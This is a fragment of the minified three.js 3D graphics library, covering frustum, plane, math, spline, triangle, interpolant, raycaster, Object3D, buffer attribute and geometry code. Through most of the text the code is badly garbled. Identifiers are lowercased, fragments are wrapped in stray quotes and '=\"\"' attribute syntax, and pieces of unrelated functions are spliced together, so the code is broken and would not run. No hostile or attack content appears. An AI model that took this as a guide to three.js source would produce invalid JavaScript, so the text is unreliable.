function(b){var c=b.geometry;null===c.boundingSphere&&c.computeBoundingSphere();a.copy(c.boundingSphere).applyMatrix4(b.matrixWorld);return this.intersectsSphere(a)}}(),\nintersectsSprite:function(){var a=new THREE.Sphere;return function(b){a.center.set(0,0,0);a.radius=.7071067811865476;a.applyMatrix4(b.matrixWorld);return this.intersectsSphere(a)}}(),intersectsSphere:function(a){var b=this.planes,c=a.center;a=-a.radius;for(var d=0;6>d;d++)if(b[d].distanceToPoint(c)<a)return!1;return!0},intersectsbox:function(){var a=\"new\" three.vector3,b=\"new\" three.vector3;return=\"\" function(c){for(var=\"\" d=\"this.planes,e=0;6\">e;e++){var f=d[e];a.x=0<f.normal.x?c.min.x:c.max.x;b.x=0<f.normal.x? c.max.x:c.min.x;a.y=\"0<f.normal.y?c.min.y:c.max.y;b.y=0<f.normal.y?c.max.y:c.min.y;a.z=0<f.normal.z?c.min.z:c.max.z;b.z=0<f.normal.z?c.max.z:c.min.z;var\" g=\"f.distanceToPoint(a),f=f.distanceToPoint(b);if(0\">g&&0>f)return!1}return!0}}(),containsPoint:function(a){for(var b=this.planes,c=0;6>c;c++)if(0>b[c].distanceToPoint(a))return!1;return!0}};THREE.Plane=function(a,b){this.normal=void 0!==a?a:new THREE.Vector3(1,0,0);this.constant=void 0!==b?b:0};\nTHREE.Plane.prototype={constructor:THREE.Plane,set:function(a,b){this.normal.copy(a);this.constant=b;return this},setComponents:function(a,b,c,d){this.normal.set(a,b,c);this.constant=d;return this},setFromNormalAndCoplanarPoint:function(a,b){this.normal.copy(a);this.constant=-b.dot(this.normal);return this},setFromCoplanarPoints:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c,d,e){d=a.subVectors(e,d).cross(b.subVectors(c,d)).normalize();this.setFromNormalAndCoplanarPoint(d,\nc);return this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.normal.copy(a.normal);this.constant=a.constant;return this},normalize:function(){var a=1/this.normal.length();this.normal.multiplyScalar(a);this.constant*=a;return this},negate:function(){this.constant*=-1;this.normal.negate();return this},distanceToPoint:function(a){return this.normal.dot(a)+this.constant},distanceToSphere:function(a){return this.distanceToPoint(a.center)-a.radius},projectPoint:function(a,\nb){return this.orthoPoint(a,b).sub(a).negate()},orthoPoint:function(a,b){var c=this.distanceToPoint(a);return(b||new THREE.Vector3).copy(this.normal).multiplyScalar(c)},intersectLine:function(){var a=new THREE.Vector3;return function(b,c){var d=c||new THREE.Vector3,e=b.delta(a),f=this.normal.dot(e);if(0===f){if(0===this.distanceToPoint(b.start))return d.copy(b.start)}else return f=-(b.start.dot(this.normal)+this.constant)/f,0>f||1<f?void 0=\"\" 0:d.copy(e).multiplyscalar(f).add(b.start)}}(),intersectsline:function(a){var=\"\" b=\"this.distanceToPoint(a.start);a=this.distanceToPoint(a.end);return\">b&&0<a||0>a&&0<b},intersectsbox:function(a){return a.intersectsplane(this)},intersectssphere:function(a){return=\"\" a.intersectsplane(this)},coplanarpoint:function(a){return(a||new=\"\" three.vector3).copy(this.normal).multiplyscalar(-this.constant)},applymatrix4:function(){var=\"\" a=\"new\" three.vector3,b=\"new\" three.matrix3;return=\"\" function(c,d){var=\"\" e=\"this.coplanarPoint(a).applyMatrix4(c),f=d||b.getNormalMatrix(c),f=this.normal.applyMatrix3(f).normalize();\" this.constant=\"-e.dot(f);return\" this}}(),translate:function(a){this.constant-=\"a.dot(this.normal);return\" this},equals:function(a){return=\"\" a.normal.equals(this.normal)&&a.constant=\"==this.constant}};THREE.Spherical=function(a,b,c){this.radius=void\" 0!=\"=a?a:1;this.phi=void\" this};=\"\" three.spherical.prototype=\"{constructor:THREE.Spherical,set:function(a,b,c){this.radius=a;this.phi=b;this.theta=c;return\" this},clone:function(){return(new=\"\" this.constructor).copy(this)},copy:function(a){this.radius.copy(a.radius);this.phi.copy(a.phi);this.theta.copy(a.theta);return=\"\" this},makesafe:function(){this.phi=\"Math.max(1E-6,Math.min(Math.PI-1E-6,this.phi));return\" this},setfromvector3:function(a){this.radius=\"a.length();0===this.radius?this.phi=this.theta=0:(this.theta=Math.atan2(a.x,a.z),this.phi=\" math.acos(three.math.clamp(a.y=\"\" this.radius,-1,1)));return=\"\" this}};=\"\" three.math=\"{DEG2RAD:Math.PI/180,RAD2DEG:180/Math.PI,generateUUID:function(){var\" .split(\"\"),b=\"Array(36),c=0,d;return\" function(){for(var=\"\">e;e++)8===e||13===e||18===e||23===e?b[e]=\"-\":14===e?b[e]=\"4\":(2>=c&&(c=33554432+16777216*Math.random()|0),d=c&15,c>>=4,b[e]=a[19===e?d&3|8:d]);return b.join(\"\")}}(),clamp:function(a,b,c){return Math.max(b,Math.min(c,a))},euclideanModulo:function(a,b){return(a%b+b)%b},mapLinear:function(a,b,c,\nd,e){return d+(a-b)*(e-d)/(c-b)},smoothstep:function(a,b,c){if(a<=b)return 0;if(a=\"\">=c)return 1;a=(a-b)/(c-b);return a*a*(3-2*a)},smootherstep:function(a,b,c){if(a<=b)return 0;if(a=\"\">=c)return 1;a=(a-b)/(c-b);return a*a*a*(a*(6*a-15)+10)},random16:function(){console.warn(\"THREE.Math.random16() has been deprecated. Use Math.random() instead.\");return Math.random()},randInt:function(a,b){return a+Math.floor(Math.random()*(b-a+1))},randFloat:function(a,b){return a+Math.random()*(b-a)},randFloatSpread:function(a){return a*\n(.5-Math.random())},degToRad:function(a){return a*THREE.Math.DEG2RAD},radToDeg:function(a){return a*THREE.Math.RAD2DEG},isPowerOfTwo:function(a){return 0===(a&a-1)&&0!==a},nearestPowerOfTwo:function(a){return Math.pow(2,Math.round(Math.log(a)/Math.LN2))},nextPowerOfTwo:function(a){a--;a|=a>>1;a|=a>>2;a|=a>>4;a|=a>>8;a|=a>>16;a++;return a}};\nTHREE.Spline=function(a){function b(a,b,c,d,e,f,g){a=.5*(c-a);d=.5*(d-b);return(2*(b-c)+a+d)*g+(-3*(b-c)-2*a-d)*f+a*e+b}this.points=a;var c=[],d={x:0,y:0,z:0},e,f,g,h,k,l,n,p,m;this.initFromArray=function(a){this.points=[];for(var b=0;b<a.length;b++)this.points[b]={x:a[b][0],y:a[b][1],z:a[b][2]}};this.getpoint=function(a){e=(this.points.length-1)*a;f=math.floor(e);g=e-f;c[0]=0===f?f:f-1;c[1]=f;c[2]=f>this.points.length-2?this.points.length-1:f+1;c[3]=f>this.points.length-3?this.points.length-1:f+\n2;l=this.points[c[0]];n=this.points[c[1]];p=this.points[c[2]];m=this.points[c[3]];h=g*g;k=g*h;d.x=b(l.x,n.x,p.x,m.x,g,h,k);d.y=b(l.y,n.y,p.y,m.y,g,h,k);d.z=b(l.z,n.z,p.z,m.z,g,h,k);return d};this.getControlPointsArray=function(){var a,b,c=this.points.length,d=[];for(a=0;a<c;a++)b=this.points[a],d[a]=[b.x,b.y,b.z];return d};this.getlength=\"function(a){var\" b,c,d,e=\"b=b=0,f=new\" three.vector3,g=\"new\" three.vector3,h=\"[],k=0;h[0]=0;a||(a=100);c=this.points.length*a;f.copy(this.points[0]);for(a=1;a<c;a++)b=\" a=\"\" c,d=\"this.getPoint(b),g.copy(d),k+=g.distanceTo(f),f.copy(d),b*=this.points.length-1,b=Math.floor(b),b!==e&&(h[b]=k,e=b);h[h.length]=k;return{chunks:h,total:k}};this.reparametrizeByArcLength=function(a){var\" b,c,d,e,f,g,h=\"[],k=new\" three.vector3,m=\"this.getLength();h.push(k.copy(this.points[0]).clone());for(b=1;b<this.points.length;b++){c=m.chunks[b]-m.chunks[b-1];g=Math.ceil(a*c/m.total);e=(b-1)/(this.points.length-1);f=b/(this.points.length-1);for(c=1;c<g-1;c++)d=e+1/g*c*(f-e),d=this.getPoint(d),\" h.push(k.copy(d).clone());h.push(k.copy(this.points[b]).clone())}this.points=\"h}};THREE.Triangle=function(a,b,c){this.a=void\" 0!=\"=a?a:new\" three.vector3;this.b=\"void\" three.vector3;this.c=\"void\" three.vector3};three.triangle.normal=\"function(){var\" three.vector3;return=\"\" function(b,c,d,e){e=\"e||new\" three.vector3;e.subvectors(d,c);a.subvectors(b,c);e.cross(a);b=\"e.lengthSq();return\" 0<b?e.multiplyscalar(1=\"\" math.sqrt(b)):e.set(0,0,0)}}();=\"\" three.triangle.barycoordfrompoint=\"function(){var\" three.vector3,b=\"new\" three.vector3,c=\"new\" function(d,e,f,g,h){a.subvectors(g,e);b.subvectors(f,e);c.subvectors(d,e);d=\"a.dot(a);e=a.dot(b);f=a.dot(c);var\" k=\"b.dot(b);g=b.dot(c);var\" l=\"d*k-e*e;h=h||new\" three.vector3;if(0=\"==l)return\" h.set(-2,-1,-1);l=\"1/l;k=(k*f-e*g)*l;d=(d*g-e*f)*l;return\" h.set(1-k-d,d,k)}}();=\"\" three.triangle.containspoint=\"function(){var\" function(b,c,d,e){b=\"THREE.Triangle.barycoordFromPoint(b,c,d,e,a);return\" 0<=\"b.x&&0<=b.y&&1\">=b.x+b.y}}();\nTHREE.Triangle.prototype={constructor:THREE.Triangle,set:function(a,b,c){this.a.copy(a);this.b.copy(b);this.c.copy(c);return this},setFromPointsAndIndices:function(a,b,c,d){this.a.copy(a[b]);this.b.copy(a[c]);this.c.copy(a[d]);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.a.copy(a.a);this.b.copy(a.b);this.c.copy(a.c);return this},area:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(){a.subVectors(this.c,this.b);b.subVectors(this.a,\nthis.b);return.5*a.cross(b).length()}}(),midpoint:function(a){return(a||new THREE.Vector3).addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},normal:function(a){return THREE.Triangle.normal(this.a,this.b,this.c,a)},plane:function(a){return(a||new THREE.Plane).setFromCoplanarPoints(this.a,this.b,this.c)},barycoordFromPoint:function(a,b){return THREE.Triangle.barycoordFromPoint(a,this.a,this.b,this.c,b)},containsPoint:function(a){return THREE.Triangle.containsPoint(a,this.a,this.b,this.c)},\nclosestPointToPoint:function(){var a,b,c,d;return function(e,f){void 0===a&&(a=new THREE.Plane,b=[new THREE.Line3,new THREE.Line3,new THREE.Line3],c=new THREE.Vector3,d=new THREE.Vector3);var g=f||new THREE.Vector3,h=Infinity;a.setFromCoplanarPoints(this.a,this.b,this.c);a.projectPoint(e,c);if(!0===this.containsPoint(c))g.copy(c);else{b[0].set(this.a,this.b);b[1].set(this.b,this.c);b[2].set(this.c,this.a);for(var k=0;k<b.length;k++){b[k].closestpointtopoint(c,!0,d);var 0=\"==d){if(a<e)break\" l=\"c.distanceToSquared(d);l<\" h&&(h=\"l,g.copy(d))}}return\" g}}(),equals:function(a){return=\"\" a.a.equals(this.a)&&a.b.equals(this.b)&&a.c.equals(this.c)}};three.interpolant=\"function(a,b,c,d){this.parameterPositions=a;this._cachedIndex=0;this.resultBuffer=void\" 0!=\"=d?d:new\" b.constructor(c);this.samplevalues=\"b;this.valueSize=c};\" three.interpolant.prototype=\"{constructor:THREE.Interpolant,evaluate:function(a){var\" b=\"this.parameterPositions,c=this._cachedIndex,d=b[c],e=b[c-1];a:{b:{c:{d:if(!(a<d)){for(var\" f=\"c+2;;){if(void\" d;this._cachedindex=\"c=b.length;return\" this.afterend_(c-1,a,e)}if(c=\"==f)break;e=d;d=b[++c];if(a<d)break\" b}d=\"b.length;break\" c}if(a=\"\">=e)break a;else{f=b[1];a<f&&(c=2,e=f);for(f=c-2;;){if(void 0=\"==e)return\" this._cachedindex=\"0,this.beforeStart_(0,a,d);if(c===f)break;d=e;e=b[--c-1];if(a\">=e)break b}d=\nc;c=0}}for(;c<d;)e=c+d>>>1,a<b[e]?d=e:c=e+1;d=b[c];e=b[c-1];if(void 0=\"==e)return\" this._cachedindex=\"0,this.beforeStart_(0,a,d);if(void\" this.interpolate_(c,e,a,d)},settings:null,defaultsettings_:{},getsettings_:function(){return=\"\" this.settings||this.defaultsettings_},copysamplevalue_:function(a){var=\"\" b=\"this.resultBuffer,c=this.sampleValues,d=this.valueSize;a*=d;for(var\" e=\"0;e!==d;++e)b[e]=\" c[a+e];return=\"\" b},interpolate_:function(a,b,c,d){throw=\"\" error(\"call=\"\" to=\"\" abstract=\"\" method\");},intervalchanged_:function(a,b,c){}};object.assign(three.interpolant.prototype,{beforestart_:three.interpolant.prototype.copysamplevalue_,afterend_:three.interpolant.prototype.copysamplevalue_});three.cubicinterpolant=\"function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d);this._offsetNext=this._weightNext=this._offsetPrev=this._weightPrev=-0};\" three.cubicinterpolant.prototype=\"Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.CubicInterpolant,DefaultSettings_:{endingStart:THREE.ZeroCurvatureEnding,endingEnd:THREE.ZeroCurvatureEnding},intervalChanged_:function(a,b,c){var\" d=\"this.parameterPositions,e=a-2,f=a+1,g=d[e],h=d[f];if(void\" three.zeroslopeending:e=\"a;g=2*b-c;break;case\" three.wraparoundending:e=\"d.length-2;g=b+d[e]-d[e+1];break;default:e=a,g=c}if(void\" three.zeroslopeending:f=\"a;h=2*c-b;break;case\" three.wraparoundending:f=\"1;h=c+d[1]-d[0];break;default:f=a-1,h=b}a=.5*(c-b);d=this.valueSize;this._weightPrev=a/(b-g);this._weightNext=a/(h-c);this._offsetPrev=e*d;this._offsetNext=f*d},interpolate_:function(a,b,c,d){var\" h=\"a-g,k=this._offsetPrev,l=this._offsetNext,n=this._weightPrev,p=this._weightNext,m=(c-b)/(d-b);c=m*m;d=c*m;b=-n*d+2*n*c-n*m;n=(1+n)*d+(-1.5-2*n)*c+(-.5+n)*m+1;m=(-1-p)*d+(1.5+p)*c+.5*m;p=p*d-p*\" c;for(c=\"0;c!==g;++c)e[c]=b*f[k+c]+n*f[h+c]+m*f[a+c]+p*f[l+c];return\" e}});three.discreteinterpolant=\"function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d)};THREE.DiscreteInterpolant.prototype=Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.DiscreteInterpolant,interpolate_:function(a,b,c,d){return\" this.copysamplevalue_(a-1)}});three.linearinterpolant=\"function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d)};\" three.linearinterpolant.prototype=\"Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.LinearInterpolant,interpolate_:function(a,b,c,d){var\" e}});three.quaternionlinearinterpolant=\"function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d)};\" three.quaternionlinearinterpolant.prototype=\"Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.QuaternionLinearInterpolant,interpolate_:function(a,b,c,d){var\" e}});three.clock=\"function(a){this.autoStart=void\" 0!=\"=a?a:!0;this.elapsedTime=this.oldTime=this.startTime=0;this.running=!1};\" three.clock.prototype=\"{constructor:THREE.Clock,start:function(){this.oldTime=this.startTime=(performance||Date).now();this.running=!0},stop:function(){this.getElapsedTime();this.running=!1},getElapsedTime:function(){this.getDelta();return\" this.elapsedtime},getdelta:function(){var=\"\" a=\"0;this.autoStart&&!this.running&&this.start();if(this.running){var\" a}};three.eventdispatcher=\"function(){};\" object.assign(three.eventdispatcher.prototype,{addeventlistener:function(a,b){void=\"\" c=\"this._listeners;void\" void=\"\" this._listeners){var=\"\" (function(a){function=\"\" b(a,b){return=\"\" a.distance-b.distance}function=\"\" c(a,b,f,g){if(!1!=\"=a.visible&&(a.raycast(b,f),!0===g)){a=a.children;g=0;for(var\" a.ray(b,c);this.near=\"f||0;this.far=g||Infinity;this.params={Mesh:{},Line:{},LOD:{},Points:{threshold:1},Sprite:{}};Object.defineProperties(this.params,{PointCloud:{get:function(){console.warn(\" three.raycaster:\"=\"\" params.pointcloud=\"\" has=\"\" been=\"\" renamed=\"\" params.points.\");return=\"\" this.points}}})};=\"\" a.raycaster.prototype=\"{constructor:a.Raycaster,linePrecision:1,set:function(a,b){this.ray.set(a,b)},setFromCamera:function(b,c){c\" instanceof=\"\" a.perspectivecamera?(this.ray.origin.setfrommatrixposition(c.matrixworld),this.ray.direction.set(b.x,b.y,.5).unproject(c).sub(this.ray.origin).normalize()):c=\"\" a.orthographiccamera?(this.ray.origin.set(b.x,b.y,(c.near+c.far)=\"\" (c.near-c.far)).unproject(c),this.ray.direction.set(0,0,-1).transformdirection(c.matrixworld)):console.error(\"three.raycaster:=\"\" unsupported=\"\" camera=\"\" type.\")},=\"\" intersectobject:function(a,e){var=\"\" f=\"[];c(a,this,f,e);f.sort(b);return\" f},intersectobjects:function(a,e){var=\"\" console.warn(\"three.raycaster.intersectobjects:=\"\" objects=\"\" is=\"\" not=\"\" an=\"\" array.\"),f;for(var=\"\" g=\"0,h=a.length;g<h;g++)c(a[g],this,f,e);f.sort(b);return\" f}}})(three);=\"\" three.object3d=\"function(){Object.defineProperty(this,\" id\",{value:three.object3didcount++});this.uuid=\"THREE.Math.generateUUID();this.name=\"\";this.type=\"Object3D\";this.parent=null;this.children=[];this.up=THREE.Object3D.DefaultUp.clone();var\"\" three.vector3,b=\"new\" three.euler,c=\"new\" three.quaternion,d=\"new\" three.vector3(1,1,1);b.onchange(function(){c.setfromeuler(b,!1)});c.onchange(function(){b.setfromquaternion(c,void=\"\" 0,!1)});object.defineproperties(this,{position:{enumerable:!0,value:a},rotation:{enumerable:!0,=\"\" value:b},quaternion:{enumerable:!0,value:c},scale:{enumerable:!0,value:d},modelviewmatrix:{value:new=\"\" three.matrix4},normalmatrix:{value:new=\"\" three.matrix3}});this.matrix=\"new\" three.matrix4;this.matrixworld=\"new\" three.matrix4;this.matrixautoupdate=\"THREE.Object3D.DefaultMatrixAutoUpdate;this.matrixWorldNeedsUpdate=!1;this.layers=new\" three.layers;this.visible=\"!0;this.receiveShadow=this.castShadow=!1;this.frustumCulled=!0;this.renderOrder=0;this.userData={}};\" three.object3d.defaultup=\"new\" three.vector3(0,1,0);three.object3d.defaultmatrixautoupdate=\"!0;\" object.assign(three.object3d.prototype,three.eventdispatcher.prototype,{applymatrix:function(a){this.matrix.multiplymatrices(a,this.matrix);this.matrix.decompose(this.position,this.quaternion,this.scale)},setrotationfromaxisangle:function(a,b){this.quaternion.setfromaxisangle(a,b)},setrotationfromeuler:function(a){this.quaternion.setfromeuler(a,!0)},setrotationfrommatrix:function(a){this.quaternion.setfromrotationmatrix(a)},setrotationfromquaternion:function(a){this.quaternion.copy(a)},rotateonaxis:function(){var=\"\" three.quaternion;return=\"\" function(b,c){a.setfromaxisangle(b,c);this.quaternion.multiply(a);return=\"\" this}}(),rotatex:function(){var=\"\" three.vector3(1,0,0);return=\"\" function(b){return=\"\" this.rotateonaxis(a,b)}}(),rotatey:function(){var=\"\" three.vector3(0,1,0);return=\"\" this.rotateonaxis(a,b)}}(),rotatez:function(){var=\"\" three.vector3(0,0,1);return=\"\" this.rotateonaxis(a,b)}}(),translateonaxis:function(){var=\"\" three.vector3;return=\"\" function(b,c){a.copy(b).applyquaternion(this.quaternion);=\"\" this.position.add(a.multiplyscalar(c));return=\"\" this}}(),translatex:function(){var=\"\" this.translateonaxis(a,b)}}(),translatey:function(){var=\"\" this.translateonaxis(a,b)}}(),translatez:function(){var=\"\" this.translateonaxis(a,b)}}(),localtoworld:function(a){return=\"\" a.applymatrix4(this.matrixworld)},worldtolocal:function(){var=\"\" three.matrix4;return=\"\" b.applymatrix4(a.getinverse(this.matrixworld))}}(),=\"\" lookat:function(){var=\"\" function(b){a.lookat(b,this.position,this.up);this.quaternion.setfromrotationmatrix(a)}}(),add:function(a){if(1<arguments.length){for(var=\"\" this}if(a=\"==this)return\" console.error(\"three.object3d.add:=\"\" object=\"\" can't=\"\" be=\"\" added=\"\" as=\"\" child=\"\" of=\"\" itself.\",a),this;a=\"\" three.object3d?(null!=\"=a.parent&&a.parent.remove(a),a.parent=this,a.dispatchEvent({type:\" added\"}),this.children.push(a)):console.error(\"three.object3d.add:\"=\"\" instance=\"\" three.object3d.\",=\"\" a);return=\"\" this},remove:function(a){if(1<arguments.length)for(var=\"\" this.getobjectbyproperty(\"id\",a)},getobjectbyname:function(a){return=\"\" this.getobjectbyproperty(\"name\",a)},getobjectbyproperty:function(a,b){if(this[a]=\"==b)return\" this;for(var=\"\" b);if(void=\"\" e}},getworldposition:function(a){a=\"a||new\" three.vector3;this.updatematrixworld(!0);return=\"\" a.setfrommatrixposition(this.matrixworld)},getworldquaternion:function(){var=\"\" function(c){c=\"c||new\" three.quaternion;this.updatematrixworld(!0);this.matrixworld.decompose(a,c,b);return=\"\" c}}(),getworldrotation:function(){var=\"\" function(b){b=\"b||new\" three.euler;this.getworldquaternion(a);return=\"\" b.setfromquaternion(a,=\"\" this.rotation.order,!1)}}(),getworldscale:function(){var=\"\" three.vector3;this.updatematrixworld(!0);this.matrixworld.decompose(a,b,c);return=\"\" c}}(),getworlddirection:function(){var=\"\" three.vector3;this.getworldquaternion(a);return=\"\" b.set(0,0,1).applyquaternion(a)}}(),raycast:function(){},traverse:function(a){a(this);for(var=\"\" this.visible){a(this);for(var=\"\" this.matrix),this.matrixworldneedsupdate=\"!1,a=!0;for(var\" b(a){var=\"\" in=\"\" a){var=\"\" d.metadata;b.push(d)}return=\"\" b}var=\"\" (e.userdata=\"this.userData);!0===this.castShadow&&(e.castShadow=!0);!0===this.receiveShadow&&(e.receiveShadow=!0);!1===this.visible&&(e.visible=!1);e.matrix=this.matrix.toArray();void\" [];for(var=\"\" d},clone:function(a){return(new=\"\" this.constructor).copy(this,a)},copy:function(a,b){void=\"\" this.matrix.copy(a.matrix);this.matrixworld.copy(a.matrixworld);this.matrixautoupdate=\"a.matrixAutoUpdate;this.matrixWorldNeedsUpdate=a.matrixWorldNeedsUpdate;this.visible=a.visible;this.castShadow=a.castShadow;this.receiveShadow=a.receiveShadow;this.frustumCulled=a.frustumCulled;this.renderOrder=a.renderOrder;this.userData=JSON.parse(JSON.stringify(a.userData));if(!0===b)for(var\" this}});three.object3didcount=\"0;\" three.face3=\"function(a,b,c,d,e,f){this.a=a;this.b=b;this.c=c;this.normal=d\" three.vector3?d:new=\"\" three.vector3;this.vertexnormals=\"Array.isArray(d)?d:[];this.color=e\" three.color?e:new=\"\" three.color;this.vertexcolors=\"Array.isArray(e)?e:[];this.materialIndex=void\" three.face3.prototype=\"{constructor:THREE.Face3,clone:function(){return(new\" this.constructor).copy(this)},copy:function(a){this.a=\"a.a;this.b=a.b;this.c=a.c;this.normal.copy(a.normal);this.color.copy(a.color);this.materialIndex=a.materialIndex;for(var\" this}};=\"\" three.bufferattribute=\"function(a,b,c){this.uuid=THREE.Math.generateUUID();this.array=a;this.itemSize=b;this.dynamic=!1;this.updateRange={offset:0,count:-1};this.version=0;this.normalized=!0===c};\" three.bufferattribute.prototype=\"{constructor:THREE.BufferAttribute,get\" count(){return=\"\" this.array.length=\"\" this.itemsize},set=\"\" needsupdate(a){!0=\"==a&&this.version++},setDynamic:function(a){this.dynamic=a;return\" this},copy:function(a){this.array=\"new\" a.array.constructor(a.array);this.itemsize=\"a.itemSize;this.dynamic=a.dynamic;return\" this},copyat:function(a,b,c){a*=\"this.itemSize;c*=b.itemSize;for(var\" this},copyarray:function(a){this.array.set(a);=\"\" return=\"\" this},copycolorsarray:function(a){for(var=\"\" color=\"\" undefined\",d),f=\"new\" three.color);b[c++]=\"f.r;b[c++]=f.g;b[c++]=f.b}return\" this},copyindicesarray:function(a){for(var=\"\" this},copyvector2sarray:function(a){for(var=\"\" vector=\"\" undefined\",=\"\" d),f=\"new\" three.vector2);b[c++]=\"f.x;b[c++]=f.y}return\" this},copyvector3sarray:function(a){for(var=\"\" three.vector3);b[c++]=\"f.x;b[c++]=f.y;b[c++]=f.z}return\" this},copyvector4sarray:function(a){for(var=\"\" three.vector4);=\"\" b[c++]=\"f.x;b[c++]=f.y;b[c++]=f.z;b[c++]=f.w}return\" this},set:function(a,b){void=\"\" this},getx:function(a){return=\"\" this.array[a*this.itemsize]},setx:function(a,b){this.array[a*this.itemsize]=\"b;return\" this},gety:function(a){return=\"\" this.array[a*this.itemsize+1]},sety:function(a,b){this.array[a*this.itemsize+1]=\"b;return\" this},getz:function(a){return=\"\" this.array[a*this.itemsize+2]},setz:function(a,b){this.array[a*this.itemsize+2]=\"b;return\" this},getw:function(a){return=\"\" this.array[a*=\"\" this.itemsize+3]},setw:function(a,b){this.array[a*this.itemsize+3]=\"b;return\" this},setxy:function(a,b,c){a*=\"this.itemSize;this.array[a+0]=b;this.array[a+1]=c;return\" this},setxyz:function(a,b,c,d){a*=\"this.itemSize;this.array[a+0]=b;this.array[a+1]=c;this.array[a+2]=d;return\" this},setxyzw:function(a,b,c,d,e){a*=\"this.itemSize;this.array[a+0]=b;this.array[a+1]=c;this.array[a+2]=d;this.array[a+3]=e;return\" this},clone:function(){return(new=\"\" this.constructor).copy(this)}};=\"\" three.int8attribute=\"function(a,b){return\" new=\"\" three.bufferattribute(new=\"\" int8array(a),b)};three.uint8attribute=\"function(a,b){return\" uint8array(a),b)};three.uint8clampedattribute=\"function(a,b){return\" uint8clampedarray(a),b)};three.int16attribute=\"function(a,b){return\" int16array(a),b)};three.uint16attribute=\"function(a,b){return\" uint16array(a),b)};=\"\" three.int32attribute=\"function(a,b){return\" int32array(a),b)};three.uint32attribute=\"function(a,b){return\" uint32array(a),b)};three.float32attribute=\"function(a,b){return\" float32array(a),b)};three.float64attribute=\"function(a,b){return\" float64array(a),b)};=\"\" three.dynamicbufferattribute=\"function(a,b){console.warn(\" three.dynamicbufferattribute\"=\"\" removed.=\"\" use=\"\" three.bufferattribute().setdynamic(=\"\" true=\"\" )=\"\" instead.\");return(new=\"\" three.bufferattribute(a,b)).setdynamic(!0)};three.instancedbufferattribute=\"function(a,b,c){THREE.BufferAttribute.call(this,a,b);this.meshPerAttribute=c||1};THREE.InstancedBufferAttribute.prototype=Object.create(THREE.BufferAttribute.prototype);THREE.InstancedBufferAttribute.prototype.constructor=THREE.InstancedBufferAttribute;\" three.instancedbufferattribute.prototype.copy=\"function(a){THREE.BufferAttribute.prototype.copy.call(this,a);this.meshPerAttribute=a.meshPerAttribute;return\" this};three.interleavedbuffer=\"function(a,b){this.uuid=THREE.Math.generateUUID();this.array=a;this.stride=b;this.dynamic=!1;this.updateRange={offset:0,count:-1};this.version=0};\" three.interleavedbuffer.prototype=\"{constructor:THREE.InterleavedBuffer,get\" length(){return=\"\" this.array.length},get=\"\" this.stride},set=\"\" a.array.constructor(a.array);this.stride=\"a.stride;this.dynamic=a.dynamic;return\" this},set:function(a,=\"\" b){void=\"\" this.constructor).copy(this)}};three.instancedinterleavedbuffer=\"function(a,b,c){THREE.InterleavedBuffer.call(this,a,b);this.meshPerAttribute=c||1};THREE.InstancedInterleavedBuffer.prototype=Object.create(THREE.InterleavedBuffer.prototype);THREE.InstancedInterleavedBuffer.prototype.constructor=THREE.InstancedInterleavedBuffer;\" three.instancedinterleavedbuffer.prototype.copy=\"function(a){THREE.InterleavedBuffer.prototype.copy.call(this,a);this.meshPerAttribute=a.meshPerAttribute;return\" this};three.interleavedbufferattribute=\"function(a,b,c){this.uuid=THREE.Math.generateUUID();this.data=a;this.itemSize=b;this.offset=c};\" three.interleavedbufferattribute.prototype=\"{constructor:THREE.InterleavedBufferAttribute,get\" length(){console.warn(\"three.bufferattribute:=\"\" .length=\"\" deprecated.=\"\" please=\"\" .count.\");return=\"\" this.data.count},setx:function(a,b){this.data.array[a*this.data.stride+this.offset]=\"b;return\" this},sety:function(a,b){this.data.array[a*this.data.stride+this.offset+1]=\"b;return\" this},setz:function(a,b){this.data.array[a*this.data.stride+this.offset+2]=\"b;return\" this},=\"\" setw:function(a,b){this.data.array[a*this.data.stride+this.offset+3]=\"b;return\" this.data.array[a*this.data.stride+this.offset]},gety:function(a){return=\"\" this.data.array[a*this.data.stride+this.offset+1]},getz:function(a){return=\"\" this.data.array[a*this.data.stride+this.offset+2]},getw:function(a){return=\"\" this.data.array[a*this.data.stride+this.offset+3]},setxy:function(a,b,c){a=\"a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;return\" this},setxyz:function(a,=\"\" b,c,d){a=\"a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;this.data.array[a+2]=d;return\" this},setxyzw:function(a,b,c,d,e){a=\"a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;this.data.array[a+2]=d;this.data.array[a+3]=e;return\" three.geometry=\"function(){Object.defineProperty(this,\" id\",{value:three.geometryidcount++});this.uuid=\"THREE.Math.generateUUID();this.name=\"\";this.type=\"Geometry\";this.vertices=[];this.colors=[];this.faces=[];this.faceVertexUvs=[[]];this.morphTargets=[];this.morphNormals=[];this.skinWeights=[];this.skinIndices=[];this.lineDistances=[];this.boundingSphere=this.boundingBox=null;this.groupsNeedUpdate=this.lineDistancesNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.uvsNeedUpdate=this.elementsNeedUpdate=\"\" this.verticesneedupdate=\"!1};\" object.assign(three.geometry.prototype,three.eventdispatcher.prototype,{applymatrix:function(a){for(var=\"\" three.matrix3).getnormalmatrix(a),c=\"0,d=this.vertices.length;c<d;c++)this.vertices[c].applyMatrix4(a);c=0;for(d=this.faces.length;c<d;c++){a=this.faces[c];a.normal.applyMatrix3(b).normalize();for(var\" this.normalsneedupdate=\"this.verticesNeedUpdate=!0;return\" this},rotatex:function(){var=\"\" a;return=\"\" function(b){void=\"\" three.matrix4);a.makerotationx(b);this.applymatrix(a);return=\"\" this}}(),rotatey:function(){var=\"\" three.matrix4);a.makerotationy(b);this.applymatrix(a);return=\"\" this}}(),rotatez:function(){var=\"\" three.matrix4);a.makerotationz(b);this.applymatrix(a);return=\"\" this}}(),translate:function(){var=\"\" function(b,=\"\" c,d){void=\"\" 